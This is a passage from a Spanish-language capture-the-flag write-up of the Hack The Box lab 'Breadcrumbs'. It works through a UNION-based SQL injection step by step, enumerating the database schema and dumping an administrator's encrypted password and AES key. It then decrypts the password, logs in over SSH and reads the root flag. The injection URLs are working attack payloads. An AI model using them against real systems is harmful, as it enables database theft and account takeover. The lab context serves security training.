    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(1) "1"
  }
}
```
Miro que base de datos se está empleando

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator%27union%20select%20database()--%20-&table=passwords
string(5) "bread"
```

Enumero todas las que hay

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator%27union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--%20-&table=passwords
string(24) "information_schema,bread"
```

Solo hay una, así que listo las tablas

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator%27union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22bread%22--%20-&table=passwords
string(9) "passwords"
```

Y las columnas

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator%27union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%22bread%22%20and%20table_name=%22passwords%22--%20-&table=passwords
string(27) "id,account,password,aes_key"
```

Dumpeo los datos

```null
view-source:http://localhost:1234/index.php?method=select&username=administrator%27union%20select%20group_concat(account,%27:%27,password)%20from%20bread.passwords--%20-&table=passwords
string(58) "Administrator:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
```

Introduzco los datos que ya tengo en CyberChef, pero espera una cadena de más longitud. Si el IV lo relleno con null bytes, obtengo la contraseña en texto claro

<img src="/writeups/assets/img/Breadcrumbs-htb/40.png" alt="">

Me puedo conectar a la máquina como el usuario Administrador

```null
ssh Administrator@10.10.10.228

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>whoami
breadcrumbs\administrator
```

Y puedo ver la segunda flag

```null
administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt
cce6b1013898d28f1ef445eb51620e49
```